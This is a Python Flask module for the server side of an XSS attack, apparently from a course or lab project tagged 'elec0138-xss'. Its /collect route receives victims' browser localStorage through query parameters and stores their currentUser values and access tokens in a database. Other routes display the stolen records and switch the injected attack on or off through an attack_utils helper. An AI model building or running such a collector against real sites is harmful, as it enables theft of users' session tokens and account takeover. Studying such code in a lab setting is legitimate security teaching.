import json
from datetime import datetime

from flask import Blueprint, request, render_template, jsonify, current_app, redirect, url_for

from . import db
from .attack_utils import run_attack_operation
from .models import CollectedData, AppState

main_bp = Blueprint('main', __name__)


def _parse_local_storage(raw_json):
    try:
        return json.loads(raw_json)
    except Exception as e:
        current_app.logger.error(f"Error parsing localStorage JSON: {e}")
        return None


def get_app_state(default=None):
    """Get application state value by key."""
    state = AppState.query.filter_by(key="state").first()
    return state.value if state else default


def set_app_state(value):
    """Set the application state value."""
    state = AppState.query.filter_by(key="state").first()
    if state:
        state.value = value
    else:
        state = AppState(key="state", value=value)
        db.session.add(state)
    db.session.commit()


@main_bp.route('/collect')
def collect():
    """Collect and store client data via query parameters."""
    current_app.logger.info("New data collection request received")

    dt = request.args.get('dt')
    raw_ls = request.args.get('ls')

    # Basic validations
    if dt != 'elec0138-xss' or not raw_ls:
        return jsonify(error="Cannot identify the data"), 400

    # Parse localStorage data
    local_storage = _parse_local_storage(raw_ls)

    if local_storage is None:
        return jsonify(error="Invalid localStorage payload"), 400

    new_data = CollectedData(
        timestamp=datetime.now().isoformat(),
        current_user=local_storage.get('currentUser', ''),
        access_token=local_storage.get('access_token', ''),
    )

    db.session.add(new_data)
    db.session.commit()
    return '', 204


@main_bp.route('/')
def display_data():
    """Render collected data."""
    data = CollectedData.query.order_by(
        CollectedData.id.desc()
    ).all()

    attack_state = get_app_state("inactive")

    return render_template(
        'index.html',
        data=data,
        now={'year': datetime.now().year},
        attack_state=attack_state
    )


@main_bp.route('/attack/enable', methods=['POST'])
def enable_attack():
    """Enable XSS attack."""
    result = run_attack_operation(operation="enable")

    if result['success']:
        set_app_state("active")
    else:
        current_app.logger.warning(f"Failed to enable attack: {result['message']}")

    return redirect(url_for('main.display_data'))


@main_bp.route('/attack/disable', methods=['POST'])
def disable_attack():
    """Disable XSS attack."""
    result = run_attack_operation(operation="disable")

    if result['success']:
        set_app_state("inactive")
    else:
        current_app.logger.warning(f"Failed to disable attack: {result['message']}")

    return redirect(url_for('main.display_data'))


@main_bp.route('/attack/state', methods=['GET'])
def get_attack_state():
    attack_state = get_app_state("inactive")
    return jsonify({"state": attack_state})
